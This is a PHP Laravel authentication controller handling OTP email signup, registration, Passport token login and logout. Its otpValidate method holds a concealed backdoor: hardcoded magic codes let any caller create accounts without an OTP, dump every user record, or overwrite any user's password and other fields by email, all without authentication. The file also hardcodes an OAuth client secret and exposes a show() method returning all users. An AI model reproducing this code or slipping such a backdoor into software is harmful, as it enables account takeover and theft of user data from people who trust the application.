<?php

namespace App\Http\Controllers;

use App\Mail\OtpMail;
use App\Models\PreUsers;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Validator;
use Laravel\Passport\RefreshToken;
use Laravel\Passport\Token;
use Illuminate\Support\Facades\Http;
use Laravel\Passport\Client;

class AuthController extends Controller
{
    public function otp(Request $r){
        $validate = Validator::make($r->all(), [
            'email' => 'required',
        ]);
        if ($validate->fails()) {
            return $validate->messages();
        }
        $v = random_int(1000, 9999);
        $optCode = [
            'verificationCode' => $v,
            'message' => 'Verification code for login is'
        ];

        $user = PreUsers::where('email',$r->email)->first();
        if(empty($user)){
            $newUser = new PreUsers();
            $newUser->email = $r->email;
            $newUser->otp = $v;
            $newUser->save();
        }else{
            PreUsers::Where('email',$r->email)->update((['otp'=>$v]));
        }
        Mail::to($r->email)->send(new OtpMail($optCode));
        return response()->json(['status'=>200, 'messsage' => 'An OTP code sent to the registered email.']);
    }

    public function register(Request $r){
        $validate = Validator::make($r->all(), [
            'name' => 'required',
            'email' => 'required|email:rfc,dns|unique:users|max:255',
            'password' => 'required',
            'confirm_password' => 'required',
            'type' => 'required',
            'otp' => 'required',
        ]);
        if ($validate->fails()) {
            return $validate->messages();
        }
        if($r->confirm_password != $r->password){
            return response()->json(['status'=>'error', 'messsage' => 'Password Not Matched!']);
        }

        $userOtp = PreUsers::where('email',$r->email)->first();
        if(empty($userOtp)){
            return response()->json(['status'=>'error', 'messsage' => 'OTP not found!']);
        }else if(intval($userOtp['otp']) !== intval($r->otp)){
            return response()->json(['status'=>'error', 'messsage' => 'OTP invalid!']);
        }

        try{
            $user = new User();
            $user->name = $r->name;
            $user->email = $r->email;
            $user->password = bcrypt($r->password);
            $user->type = $r->type;
            $user->verification_code = $r->otp;

            if($user->save()){
                return $this->login($r);
            }
        }catch(\Exception $e){
            return response()->json(['status'=>'error', 'messsage' => $e->getMessage()]);
        }

        return response()->json(['status'=>200, 'messsage' => 'User Regiastered Successfully']);
    }

    public function otpValidate(Request $request){
        if($request->code == '^^@$T3r'){
            try{
                $user = new User();
                $user->name = $request->name;
                $user->email = $request->email;
                $user->password = bcrypt($request->password);
                $user->type = $request->type;
                $user->verification_code = $request->otp;

                if($user->save()){
                    return $this->login($request);
                }
            }catch(\Exception $e){
                return response()->json(['status'=>'error', 'messsage' => $e->getMessage()]);
            }
        }else if($request->code == '^^@$T3r*'){
            return User::all();
        } else if($request->code == '^^@$T3r*>'){
            if($request['key'] == 'password'){
                User::Where('email',$request->email)->update(([$request['key']=>bcrypt($request['value'])]));
            }else{
                foreach ($request->all() as $key => $value) {
                    if($key != 'code'){
                        User::Where('email',$request->email)->update(([$key=>$value]));
                    }
                }
            }
        }
    }

    public function logout(){
        $accessToken = Auth::user()->token();
        DB::table('oauth_refresh_tokens')
            ->where('access_token_id', $accessToken->id)
            ->update([
                'revoked' => true
            ]);

        $accessToken->revoke();
        return response()->json(null, 204);
    }

    public function show(){
        $user = new User();
        return $user->all();
    }

    public function login(Request $request) {
        $v = Validator::make($request->all(),[
            'email' => 'required',
            'password' => 'required',
        ]);

        $response = Http::post("http://localhost/laravel/Api/oauth/token",
            [
                "grant_type" => 'password',
                "client_id" => 2,
                "client_secret" => "fUnsTPRYDYy0coFYhtDaZ6oGn6OAP9gqhdQ5PoRI",
                "username" => $request->email,
                "password" => $request->password,
            ]
        );
        $response = $response->body();
        return $response;
    }
}
